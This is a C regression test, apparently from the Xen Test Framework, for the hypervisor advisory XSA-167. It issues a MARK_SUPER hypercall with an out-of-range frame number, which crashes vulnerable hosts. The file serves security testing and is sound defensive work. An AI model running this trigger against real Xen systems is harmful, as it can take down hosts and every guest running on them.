/**
 * @file tests/xsa-167/main.c
 * @ref test-xsa-167
 *
 * @page test-xsa-167 XSA-167
 *
 * Advisory: [XSA-167](http://xenbits.xen.org/xsa/advisory-167.html)
 *
 * The MMUEXT subops MARK_SUPER and UNMARK_SUPER do not perform a range check
 * on the `mfn` parameter before indexing the superframe array.  They do
 * however perform an 2MB alignment check.
 *
 * This PoC attempts to mark the largest possible 2MB aligned mfn,
 * `0xffffffffffe00000`, as a superpage.  On a sample Xen, the index into the
 * superframe array causes an attempted deference of the pointer
 * `0x03ffffffffff8000`, suffering a @#GP fault because of being
 * non-canonical.
 *
 * PV superpages are disabled by default, and must be enabled by booting Xen
 * with the `"allowsuperpage"` command line option.
 *
 * If Xen is vulnerable to XSA-167, the expected outcome of this test is a
 * host crash.  If Xen is not vulnerable, the hypercall should fail with
 * -EINVAL.
 *
 * @sa tests/xsa-167/main.c
 */
#include <xtf/lib.h>

void test_main(void)
{
    printk("XSA-167 PoC\n");

    mmuext_op_t op =
    {
        .cmd = MMUEXT_MARK_SUPER,
        .arg1.mfn = (-1ULL << L2_PT_SHIFT),
    };

    printk("  Attempting to mark mfn %#lx as a superpage\n", op.arg1.mfn);
    int rc = hypercall_mmuext_op(&op, 1, NULL, DOMID_SELF);

    switch ( rc )
    {
    case -ENOSYS:
        return xtf_skip("PV superpage support not detected\n");

    case -EINVAL:
        return xtf_success("Xen correctly rejected the bogus mark attempt\n");

    case 0:
        return xtf_failure("Marking bogus superpage succeeded\n");

    default:
        return xtf_error("Unexpected error %d\n", rc);
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
